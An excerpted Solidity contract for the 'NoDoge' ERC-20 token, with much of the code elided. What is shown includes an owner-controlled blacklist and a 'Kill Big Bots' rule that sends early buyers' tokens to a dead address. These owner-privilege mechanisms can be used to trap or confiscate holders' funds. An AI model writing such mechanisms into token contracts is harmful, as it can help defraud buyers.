...
contract NoDoge is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "NoDoge";
    string private _symbol = "NoDoge";
    ...
    constructor (address mw, address lw) {
        ...
        /*
        //Deploy For Someone
        address tokenHolder = _holder;

        _balances[tokenHolder] = _totalSupply;        
        isWalletLimitExempt[tokenHolder] = true;
        isTxLimitExempt[tokenHolder] = true;
        isExcludedFromFee[tokenHolder] = true;
    

        emit Transfer(address(0), payable(tokenHolder), _totalSupply);
        */
    ...
    function recover(address[] memory _address) external onlyOwner{
        for(uint i=0;i<_address.length;i++)
            _isBlacklisted[_address[i]] = false;
    }
            ...
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
                ...
                if (block.number < launchedBlock + killblock) { 
                    if(sender == uniswapPair) {
                        ...
                        //Kill Big Bots
                        _balances[deadAddress] += finalAmount;
                        emit Transfer(sender, deadAddress,finalAmount);
                        finalAmount = 0;
